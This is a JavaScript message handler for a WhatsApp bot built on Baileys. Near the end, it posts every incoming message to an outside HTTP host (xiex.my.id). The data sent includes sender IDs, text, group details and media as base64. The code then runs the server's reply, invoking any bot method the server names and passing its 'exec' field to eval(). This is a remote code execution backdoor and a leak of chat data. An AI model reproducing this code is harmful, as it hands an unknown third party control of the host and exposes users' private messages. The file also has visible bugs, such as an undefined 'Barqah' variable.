debug = false;
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const console = require('console')

global.db.database = global.db.database||{};
global.db.database.ban = global.db.database.ban||{};

module.exports = brainxiex = async (brainxiex, m, chatUpdate, store) => {
    try {
        if(global.db.database.ban.includes(m.sender)||global.db.database.ban.includes(m.chat)) return m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await brainxiex.decodeJid(brainxiex.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted || m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
	
        // Group
        const groupMetadata = m.isGroup ? await brainxiex.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
        

        // Push Message To Console && Auto Read
        if (m.message) {
            brainxiex.readMessages([m.key])
        }
	
        

	    
	 
        
      // Mute Chat
      if (itsMe) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: brainxiex.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, brainxiex.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        brainxiex.ev.emit('messages.upsert', msg)
        }
	    
        try {
            ppuser = await Barqah.profilePictureUrl(m.sender, 'image')
        } catch {
            ppuser = 'http://xiex.my.id/media/1655612010102undefined.png'
        }

        try {
            ppimg = await Barqah.profilePictureUrl(m.chat, 'image')
        } catch {
            ppimg = 'http://xiex.my.id/media/1655612010102undefined.png'
        }
	    
        try {
            ppku = await Barqah.profilePictureUrl(botNumber, 'image')
        } catch {
            ppku = 'http://xiex.my.id/media/1655612010102undefined.png'
        }

	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]

        m.versi = [0,1,1]
        
        // auto set bio
	    if (true) {
		    await brainxiex.setStatus(`V${m.versi[0]}.${m.versi[1]}.${m.versi[2]} | running on xiex.my.id`)
	    }

        m.body = body
        m.budy = budy
	    m.user = brainxiex.user
        m.user.jid = botNumber
        m.dariku = itsMe
        m.text = text
        m.isMedia = isMedia

        m.groupMetadata = groupMetadata
        m.groupName = groupName
        m.participants = participants
        m.groupAdmins = groupAdmins
        m.isAdmins = isAdmins
        m.isBotAdmins = isBotAdmins
        m.isPremium = isPremium
        m.mentionUser = mentionUser

        m.media = isMedia ? Buffer.from( await brainxiex.downloadMediaMessage(quoted) ).toString('base64') : ""

        //m.global = global
        m.idbot = botinfo.idbot
        m.botinfo = botinfo

        m.pp = {gc: ppimg,sender: ppuser,bot: ppku}

        //if(!m.sender.includes(`628979059392`)) return

        console.log(`[${m.sender}]\n${m.body}`)

        await Object.keys(m).forEach(e => {
            if(typeof m[e] == "function"){
                delete m[e];
            }
        });
        brainxiex.diem = () => null;
        brainxiex.error = brainxiex.sendMessage;
        console.log( `${JSON.parse(JSON.stringify(m,null,2))}` )
        axios.post(`http://xiex.my.id//virtual-bot/`,{m}).then(r => {
        try{
            const {Barqah} = r.data;
            debug ? console.log(JSON.stringify(r.data,null,2)) : null

            try{brainxiex[Barqah.action](Barqah.to,Barqah.msg,Barqah.req)}catch(e){}
            Object.keys(Barqah).includes("exec") ? eval(Barqah.exec) : null;
        }catch(e){
            console.error(e)
        }
        }).catch(console.err)
	    
       
        

    } catch (err) {
        console.error(err)
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
